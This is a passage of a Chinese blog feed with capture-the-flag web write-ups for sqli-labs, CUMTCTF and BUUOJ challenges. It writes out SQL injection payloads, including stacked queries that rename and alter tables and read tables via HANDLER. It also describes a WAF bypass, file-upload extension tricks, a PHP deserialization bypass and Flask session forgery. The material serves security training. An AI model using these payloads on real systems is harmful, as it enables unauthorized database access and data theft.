src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggryuxtx84j30j80c0wfa.jpg" alt=""><br>查看源代码发现注释符#和–被过滤掉了。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1ggrz7cg9nuj30id04jt8s.jpg" alt=""><br>发现sql语句。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggrz7qziu3j31bk0l77bv.jpg" alt=""><br>不能使用注释符，所以构造payload:?id=999’ union select 1,2,3 ‘将单引号闭合。<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggrzchcc8qj31330ly454.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggrzcol0f8j31490l0wlm.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggrzcu2srbj312y0lzagv.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1ggrzd2llzvj315g0lsdn5.jpg" alt=""><br>接着使用联合注入进行注入。</p><h2 id="第二十四关"><a href="#第二十四关" class="headerlink" title="第二十四关"></a>第二十四关</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL注入之sqli-labs学习&quot;&gt;&lt;a href=&quot;#SQL注入之sqli-labs学习&quot; class=&quot;headerlink&quot; title=&quot;SQL注入之sqli-labs学习&quot;&gt;&lt;/a&gt;SQL注入之sqli-labs学习&lt;/h1&gt;&lt;h2 id=&quot;第一关&quot;&gt;
      
    
    </summary>
    
    
      <category term="web" scheme="https://devildragons.github.io/categories/web/"/>
    
    
      <category term="sql注入" scheme="https://devildragons.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>CUMTCTF题解</title>
    <link href="https://devildragons.github.io/2020/06/09/CUMTCTF-web/"/>
    <id>https://devildragons.github.io/2020/06/09/CUMTCTF-web/</id>
    <published>2020-06-08T16:00:00.000Z</published>
    <updated>2020-09-20T02:42:07.157Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h1 id="入门题："><a href="#入门题：" class="headerlink" title="入门题："></a>入门题：</h1><h2 id="1、array"><a href="#1、array" class="headerlink" title="1、array"></a>1、array</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6e40b1lj30na06x749.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6edjs8xj31720pdjt9.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6erm1u8j30tc0jd0u1.jpg" alt=""></p><p>从表中可知道改=该正则表达式^[1-9]+$表示要匹配一次或多次1到9的数字<br>从代码可以知道需要把X-Forwarded-For设置为127.0.0.1,才可以往下执行</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6fb3l2hj30nu05ydg3.jpg" alt=""><br>如果传入的element是数组则返回NULL，而NULL和FALSE类型不一样所以可以绕过，<br>pass是数组的话也返回NULL，而pass1不为空，所以可以绕过strcmp函数</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6g5t6yxj30cc018we9.jpg" alt=""></p><p>于是传element和pass的参数为数组形式然后抓包</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6go6zcuj30k0074wf9.jpg" alt=""><br>添加X-Forwarded-For:127.0.0.1将ip修改为127.0.0.1从而获得flag.</p><h2 id="2、easy-file-get-contents"><a href="#2、easy-file-get-contents" class="headerlink" title="2、easy_file_get_contents"></a>2、easy_file_get_contents</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6i7lzpqj30on06hjrh.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6igo5soj30lb0engm4.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6indj7yj30tc0agq3k.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6j68cnuj30sv06674g.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6jclt7mj30dr072jrf.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6jq5lbpj30fs01u0sj.jpg" alt=""></p><p>所以构造payload，path=flag.php将flag.php中的内容复制到path中，</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6kjuwhgj30n101b0sm.jpg" alt=""><br>所以构造user这段payload来满足if语句<br>从而获得flag<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6l5jskoj30d201gdfn.jpg" alt=""></p><h2 id="3、chang-script"><a href="#3、chang-script" class="headerlink" title="3、chang_script"></a>3、chang_script</h2><p><strong>本地文件包含漏洞</strong><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6n97wnjj30xo0b074m.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6nhgkfyj30if05x74h.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6nw7z5rj30o30a4q3a.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6o60gmjj30fv0ihjrn.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6oe11wmj30dm061jrg.jpg" alt=""><br>Eval()会将参数字符串当作命令语句执行，故利用类似单引号闭合的原理可以注入语句。构造payload如下</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6ozlzcqj30ee01g3yb.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6p7cux1j311n029glm.jpg" alt=""><br>然后获得url编码的flag，进行url解码即可获得最终flag<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6ptxiz8j30lt087q2w.jpg" alt=""></p><h1 id="挑战题："><a href="#挑战题：" class="headerlink" title="挑战题："></a>挑战题：</h1><h2 id="1、源代码"><a href="#1、源代码" class="headerlink" title="1、源代码"></a>1、源代码</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6r4urq1j30jc0dngoh.jpg" alt=""><br>由题目知道需要查看源代码</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6rir51qj30g105zweh.jpg" alt=""><br>去掉其中的歌词获得flag</p><h2 id="2、colorSnake"><a href="#2、colorSnake" class="headerlink" title="2、colorSnake"></a>2、colorSnake</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6t6whkvj30wl09wmxd.jpg" alt=""><br>靠手玩获得flag是不可能的</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6tjvxwuj30i904pmx8.jpg" alt=""><br>看源代码发现js脚本</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6tyd58tj30iz0bqwf5.jpg" alt=""><br>查看脚本发现得分的php，这里面有个xhr，介绍一下xhr，xhr叫XMLHttpRequest ，XMLHttpRequest 对象提供了对 HTTP 协议的完全的访问，包括做出 POST 和 HEAD 请求以及普通的 GET 请求的能力。XMLHttpRequest 可以同步或异步地返回 Web 服务器的响应，并且能够以文本或者一个 DOM 文档的形式返回内容。</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6un0n8yj30ov06y3yt.jpg" alt=""><br>访问该界面</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6uzd4ldj30ea0e2dg5.jpg" alt=""><br>发现有json格式的东西，把里面的msg部分的内容unicode解码得到一句话，<br>可以猜到应该是用这个去访问页面去增加得分，每刷新一下这个页面发现score加一了，但是刷新的太快又会重新置0</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6vipcrgj30kk05l0sr.jpg" alt=""><br>所以可以规律性的停一秒刷新一下，也可以写个脚本从而获得flag.</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6w235bsj30lg07e0t2.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6we5utlj30bd04pdfr.jpg" alt=""></p><p>获得flag</p><h2 id="3、备份"><a href="#3、备份" class="headerlink" title="3、备份"></a>3、备份</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6x92u4vj30o007nglz.jpg" alt=""><br>题目有很多备份要从中找到flag就写个脚本，把有flag的备份文件显示出来</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6xne530j30ju06674e.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm6xv9ylbj308003hq2r.jpg" alt=""></p><p>在第998个备份文件里获得flag.</p><h2 id="4、上传一、二"><a href="#4、上传一、二" class="headerlink" title="4、上传一、二"></a>4、上传一、二</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8d09hzjj30k50fpglq.jpg" alt=""><br>发现是php网页，但是不能上传php文件只能上传图片</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8fasjmwj30nt084mxb.jpg" alt=""></p><p>于是上传一张图片，然后抓包修改图片后缀为php<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8fwgbmqj30yp0ik772.jpg" alt=""></p><p>得到flag发现还送了一个上传二的flag，于是两题flag到手<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8gcy9lqj30dc01m0sj.jpg" alt=""></p><p>上传二需要Content-Type为image才能看到flag</p><h2 id="5、Cookie"><a href="#5、Cookie" class="headerlink" title="5、Cookie?"></a>5、Cookie?</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8pqpvbzj30gm05mglo.jpg" alt=""><br>发现要用管理员身份登录，于是抓包</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8qcmtcrj30dw06saaa.jpg" alt=""><br>发现user是guest，于是修改user为admin<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8u50pfej30gx07njrm.jpg" alt=""><br>发现一张图片</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8uloz1sj307v09vgoh.jpg" alt=""></p><p>打开没发现什么</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8viian3j30vr0f941w.jpg" alt=""><br>百度识图，所以这题应该是维吉尼亚密码</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8w02m18j30f909gmx7.jpg" alt=""><br>解密获得flag</p><h2 id="6、is-hash-safe"><a href="#6、is-hash-safe" class="headerlink" title="6、is hash safe?"></a>6、is hash safe?</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8xq49cjj30ss07gt8u.jpg" alt=""><br>打开发现又要是管理员，于是抓包<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8y0uy2oj30qn0gdt9v.jpg" alt=""><br>将role改为admin并没有什么变化，题目说有东西没删掉所以应该有备份的文件尝试phps，php无果后</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm8yesvgfj30a9040745.jpg" alt=""></p><p>尝试.swp发现有文件<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm93jm1aij30ui0oedhh.jpg" alt=""><br>我们可以用vim -r命令去回复备份文件vim -r admin.php.swp，发现源代码</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm93w2a57j30d907maa6.jpg" alt=""></p><p>这题考的是<strong>hash长度拓展攻击</strong><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm94dafa8j30nz05et8y.jpg" alt=""><br>我们可用hashpump这个工具来伪造admin的身份，记得要把数据URL编码一下<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm94srt1bj30uo0ewgmr.jpg" alt=""><br>最后获得flag</p><h2 id="7、Logic"><a href="#7、Logic" class="headerlink" title="7、Logic"></a>7、Logic</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm95vhznzj30h20cb0sr.jpg" alt=""><br>查看源代码<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm96ado7qj30k307st99.jpg" alt=""><br>发现一个php，访问它<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm96tditmj30hj044weg.jpg" alt=""><br>又是说不是admin，继续抓包<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm9765sbej30op0aht9f.jpg" alt=""><br>没什么发现，所以猜测和上题一样有备份文件，尝试.swp</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm97hw289j30s90asdgp.jpg" alt=""></p><p>发现代码，说明token是10个0</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm97qbd5sj30lh08f752.jpg" alt=""></p><p>再次查看源代码发现admin是chenyurui邮箱格式是gmail，<br>而且这里显示了编辑器是Vim，而Vim编辑器的备份文件是.swp。</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm986xpotj30jr0bkmx8.jpg" alt=""><br>然后登陆</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm98pkqi0j30bm02o743.jpg" alt=""></p><p>获得flag</p><h2 id="8、听说你会面向对象"><a href="#8、听说你会面向对象" class="headerlink" title="8、听说你会面向对象"></a>8、听说你会面向对象</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm99z1ziej30mj0mbwg1.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm9a8er4ij30pj03sq30.jpg" alt=""></p><p>打开发现题目源代码</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm9agzpb9j30oi0c3gmf.jpg" alt=""></p><p>发现是PHP反系列化题目<br><a href="https://www.freebuf.com/articles/web/167721.html" target="_blank" rel="noopener" title="反序列化介绍">https://www.freebuf.com/articles/web/167721.html</a><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm9bbjlebj30ca0duq3a.jpg" alt=""></p><p>所以写一个php构造这个序列<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm9byp377j30ar018742.jpg" alt=""></p><p>然后用GET方式传data<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm9cnwtx1j30gd0a2dgf.jpg" alt=""><br>发现错误，所以是_wakeup函数的问题，PHP当序列化字符串中表示对象属性数的值大于真实的属性个数时会跳过__wakeup()的执行。</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm9d3rp30j30h305w0so.jpg" alt=""><br>所以把Admin后的数值改得比1大就得到flag</p><h2 id="9、上传三"><a href="#9、上传三" class="headerlink" title="9、上传三"></a>9、上传三</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm9dxf9caj30p804oglj.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm9e53ia8j30z50dv762.jpg" alt=""><br>php,php2,php3,php4,php5等都过滤掉了，直到试到phtml的时候回显出来一句话，发现是<strong>条件竞争</strong>题目<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm9emdwhsj30m905jdfx.jpg" alt=""><br>于是写脚本<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm9evxlg6j30dr00wq2r.jpg" alt=""></p><p>耐心等待几分钟从而获得flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h1 id=&quot;入门题：&quot;&gt;&lt;a href=&quot;#入门题：&quot; class=&quot;headerlink&quot; title=&quot;入门题：&quot;&gt;&lt;/a&gt;入门题
      
    
    </summary>
    
    
      <category term="web" scheme="https://devildragons.github.io/categories/web/"/>
    
    
      <category term="cumt" scheme="https://devildragons.github.io/tags/cumt/"/>
    
  </entry>
  
  <entry>
    <title>BUUOJ题解</title>
    <link href="https://devildragons.github.io/2020/06/09/BUUOJ%20CTF/"/>
    <id>https://devildragons.github.io/2020/06/09/BUUOJ%20CTF/</id>
    <published>2020-06-08T16:00:00.000Z</published>
    <updated>2020-09-22T14:53:45.428Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUOJ"><a href="#BUUOJ" class="headerlink" title="BUUOJ"></a><em>BUUOJ</em></h1><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9opzsedcj307q02g3yd.jpg" alt=""></p><p>查看源码，发现提升，打开source.php页面</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm4uifequj30no0oxdhl.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm4uzwofrj30rp07zt9a.jpg" alt=""><br>看到题目php代码</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9otp9bbhj30k902qweh.jpg" alt=""></p><p>打开hint.php页面，发现提示。<br>回到source.php页面，函数代码中有四个if语句</p><pre><code>第一个if语句对变量进行检验，要求$page为字符串，否则返回false第二个if语句判断$page是否存在于$whitelist数组中，存在则返回true第三个if语句判断截取后的$page是否存在于$whitelist数组中，截取$page中&apos;?&apos;前部分，存在则返回true第四个if语句判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true若以上四个if语句均未返回值，则返回false</code></pre><p>有三个if语句可以返回true，第二个语句直接判断$page，不可用<br>第三个语句截取’?’前部分，由于?被后部分被解析为get方式提交的参数，也不可利用<br>第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?’，仍可通过第四个if语句校验。（’?’两次编码值为’%253f’）,构造url：<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9p1nmo3rj30rv037wej.jpg" alt=""><br>无返回值，由于我们不知道ffffllllaaaagggg文件的具体位置，只能依次增加../，最终在<img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9p3bfc4bj30x205r750.jpg" alt=""><br>中成功回显flag</p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9p6owmc0j30x304waah.jpg" alt=""><br>该题考查<strong>堆叠注入</strong><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9pd5u3nfj31bi0520t3.jpg" alt=""><br>输入1’提交页面不正常</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9peqna3ij30cd0hk750.jpg" alt=""></p><p>输入1’ or 1=1 #，页面变为正常，说明存在注入。</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9pj0d3nzj30hi04s0st.jpg" alt=""></p><p>输入1’ order by 3#，页面出现错误，说明只有两个字段</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9pl8yxfrj30mn04jq2x.jpg" alt=""></p><p>使用union select查询，发现很多语句被过滤。</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9pso2bowj30kg0mx0tm.jpg" alt=""></p><p>使用堆叠注入1’;show databases; #列出数据库名。</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9pvbzlxlj30hx0gmgma.jpg" alt=""></p><p>接着使用1’;show tables;#查询出表</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9px8yi8cj309g0o6dgo.jpg" alt=""></p><p>使用1’;show columns from words;#查出表words的字段</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9q1mxqi0j30bk0h3q3i.jpg" alt=""></p><p>然后使用<code>1&#39;;show columns from `1919810931114514`;#</code>查出表1919810931114514的字段(如果表名为纯数字，则需要加上`),从而发现flag字段。</p><p>因为这里有两张表，会县内容肯定是从word这张表中回显的，那我们怎么才能让它回显flag所在的表呢</p><p>内部查询语句类似 : select id, data from word where id =</p><p>(这里从上面的对word列的查询可以看到它是有两列，id和data)</p><p>然后1919810931114514只有一个flag字段</p><p>这时候虽然有强大的正则过滤，但没有过滤alert和rename关键字</p><p>这时候我们就可以已下面的骚姿势进行注入：</p><p>1.将words表改名为word1或其它任意名字</p><p>2.1919810931114514改名为words</p><p>3.将新的word表插入一列，列名为id</p><p>4.将flag列改名为data</p><p>构造payload</p><pre><code>1&apos;;rename table words to word1;rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);#</code></pre><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9q65ogotj30io06mq32.jpg" alt=""></p><p>然后使用1’ or 1=1 #查询获得flag.</p><p>第二种方法，参考[GYCTF2020]Blacklist<br>构造Payload:</p><pre><code>1&apos;;handler `1919810931114514` open;handler `1919810931114514` read first;handler `1919810931114514` close;#</code></pre><p>获得flag。</p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>同样是考察堆叠注入</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qe0hjvej30g7046746.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qhhl6mej30eo04q0sn.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qhqxmofj30ev04x747.jpg" alt=""></p><p>输入1发现页面有回显，输入1-1数值改变，说明是数值型的注入。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qkfyws7j31cl044wen.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qkzny0hj30er03mwef.jpg" alt=""></p><p>依次查询数据库并查询出表，并发现Flag表</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qnjgiugj30fr032gli.jpg" alt=""></p><p>但发现from Flag被过滤所以不能直接读取flag</p><p>看了别人的题解知道本题的原理</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qpv9tp0j30cy01kdfn.jpg" alt=""></p><p>解题思路1：</p><p>payload：<img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qtrqv9hj301e00y0dl.jpg" alt=""></p><p>查询语句：<img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qt6po3gj307f00xmwx.jpg" alt=""></p><p>解题思路2：</p><p>payload:1;</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qsq9fjbj30b100uwea.jpg" alt=""></p><p>解析：</p><pre><code>在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接。但在mysql 缺省不支持。需要调整mysql 的sql_mode模式：pipes_as_concat 来实现oracle 的一些功能。</code></pre><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>本题考查<strong>ssti(服务端模板注入)</strong><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaa6dsmr9j309h043745.jpg" alt=""></p><p>打开页面发现3个文件</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaa8gc7ajj307n02h742.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaaeo8xoej30x601m0ss.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaa8smxbmj304w029we9.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaaf34iioj30wh01vglo.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaa91n0zhj30b9026glf.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaafapucfj30ux01qmx7.jpg" alt=""></p><p>依次打开三个txt文件得到提示，所以需要知道cookie_secret。</p><p><a href="https://blog.csdn.net/qq78827534/article/details/80792514" target="_blank" rel="noopener" title="render函数介绍">https://blog.csdn.net/qq78827534/article/details/80792514</a></p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaai2hq1uj30uu01w0ss.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaaiwi6ifj308f036dfm.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaaj6kp2cj30jz025mx4.jpg" alt=""></p><p>只修改文件名不修改文件hash值，报错。</p><p>可以看到在报错的url中参数msg值为Error，然后界面就显示Error。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaaovcufmj30xt0330sy.jpg" alt=""><br>继续修改证实此处存在模板注入<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaaqglp4mj31ap0h9403.jpg" alt=""><br>在这里我们应该可以得到cookie_secret</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaas3fnwdj30b9026glf.jpg" alt=""></p><p>然后照着hint解出文件得hash值</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaax5makhj314h0hk3zl.jpg" alt=""></p><p>从而获得flag。</p><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfab2fglexj31540jsgzp.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfab3fdaq7j30cx0bc42b.jpg" alt=""></p><p>尝试万能密码<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfab4aph2oj30pp0d8qa3.jpg" alt=""></p><p>获得flag.</p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfab99x02cj315207oglp.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfab8totonj30ln066aap.jpg" alt=""></p><p>查看源代码，发现提示所以需要绕过WAF。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfabgnz7w1j30v30bpt9s.jpg" alt=""></p><p>查看calc.php页面，显示了waf的法则。</p><p>进行绕waf，首先了解一下php的解析规则，当php进行解析的时候，如果变量前面有空格，会去掉前面的空格再解析，那么我们就可以利用这个特点绕过waf。</p><p>num被限制了，那么’  num’呢，在num前面加了空格。waf就管不着了，因为waf只是限制了num，waf并没有限制’  num’，当php解析的时候，又会把’   num’前面的空格去掉在解析，利用这点来上传非法字符</p><p>构造payload来查看目录，用chr转化成ascll码进行绕过<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfabuatrf6j31gu0hgtaf.jpg" alt=""><br>发现 string(5) “f1agg”<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfabyjc1ynj31250h9my7.jpg" alt=""><br>查看flag。</p><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfac0kkj6ej30ek07yjrq.jpg" alt=""></p><p>查看源代码，发现提示<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfac1m4l3kj31820ejgmy.jpg" alt=""></p><p>构造payload获得flag。</p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>存在以下三种解法：</p><pre><code>flask session 伪造unicode欺骗条件竞争</code></pre><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaglrpya9j30mk0h7js1.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfagmn0wcij30ia09h3yk.jpg" alt=""></p><p>注册一个test用户，登录。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfagoh0dvwj30ry08udh3.jpg" alt=""><br>在修改密码的源码中发现提示。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfagqd7i8tj30m70avaay.jpg" alt=""></p><p>下载文件</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaijmd63ej30jw03edfv.jpg" alt=""></p><p>是一个flask项目，那就直接先奔路由去看一下，打开route.py，看一下index的注册函数代码</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaikmtd1aj30qx09at9f.jpg" alt=""><br>发现index注册函数没做什么处理，直接返回index.html渲染模版，于是我们看一下templates/index.html代码</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaiovsvsej30ql0ndmza.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaip70juwj30pc0fyt9w.jpg" alt=""></p><p>发现真的是要登录成admin才能得到flag。于是继续看向route.py文件，看看login和change password的注册函数处理代码是怎么写的。</p><p><strong>解法一 —— flask session 伪造</strong></p><p>我们可以用python脚本把flask的session解密出来，但是如果想要加密伪造生成我们自己的session的话，还需要知道flask用来签名的SECRET_KEY，在github源码里找找，可以在config.py里发现下面代码</p><p><a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener" title="flask_session_manage">https://github.com/noraj/flask-session-cookie-manager</a><br><img 